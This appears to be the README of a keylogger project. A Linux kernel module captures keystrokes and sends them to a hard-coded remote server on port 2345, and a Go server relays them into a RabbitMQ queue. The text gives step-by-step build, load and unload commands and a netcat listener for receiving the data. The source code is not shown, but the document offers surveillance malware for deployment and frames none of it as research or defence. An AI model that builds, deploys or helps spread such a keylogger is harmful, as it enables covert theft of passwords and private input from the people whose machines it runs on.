# Keylogger

## Server

The server listens on port 2345 and forwards received keystrokes to RabbitMQ.

Install RabbitMQ:

```
docker run -d --name rabbitmq -e RABBITMQ_DEFAULT_USER=user -e RABBITMQ_DEFAULT_PASS=password -p 8080:15672 -p 5672:5672 rabbitmq:3-management
```

Go to the management console exposed at port 8080 and create a queue `keystrokes`. Then start the server inside the `server/master` folder:

```
RABBITMQ_URI="amqp://user:password@localhost:5672/" RABBITMQ_QUEUE=keystrokes go run main.go
```

## Kernel Module

Follow these steps to install the kernel module onto the linux machine. It will capture keystrokes  
and send them to a hard coded server address at port 2345.

For testing, you can start a TCP listener at that server with `nc -l 2345`.

1. Compile the kernel module

    ```
    make
    ```

2. Load the kernel module

    ```
    sudo insmod keylogger.ko
    sudo lsmod # show kernel modules
    ```

3. View kernel logs

    ```
    sudo dmesg
    ```

4. Unload the kernel module
    ```
    sudo rmmod keylogger
    ```
